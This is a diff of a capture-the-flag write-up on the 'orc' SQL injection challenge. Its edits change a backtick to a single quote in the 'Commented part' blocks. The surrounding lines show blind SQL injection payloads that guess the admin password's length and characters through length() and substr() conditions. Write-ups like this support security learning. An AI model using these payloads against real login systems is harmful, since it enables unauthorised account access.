@@ -40,7 +40,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR length(pw)=1 #'
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR length(pw)=1
 
 ## Commented part:
-`
+'
 ```
 
 ![2](https://github.com/Kunull/Write-ups/assets/110326359/8a33f464-e7de-4d4a-a47c-7285e7d69ea9)
@@ -63,7 +63,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND leng
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8
 
 ## Commented part:
-`
+'
 ```
 
 ![3](https://github.com/Kunull/Write-ups/assets/110326359/9d922a6a-4f1e-4b4a-a3bd-e8d8b721ba3e)
@@ -94,7 +94,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND subs
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 #
 
 ## Commented part:
-`
+'
 ```
 
 ![5](https://github.com/Kunull/Write-ups/assets/110326359/53f17b2b-b80d-4b8e-a904-bd88c1cbb7f3)
@@ -117,7 +117,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND subs
 SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0
 
 ## Commented part:
-`
+'
 ```
 
 ![6](https://github.com/Kunull/Write-ups/assets/110326359/7abdfbc4-b2e1-4448-ad7e-8e38484d4cc1)
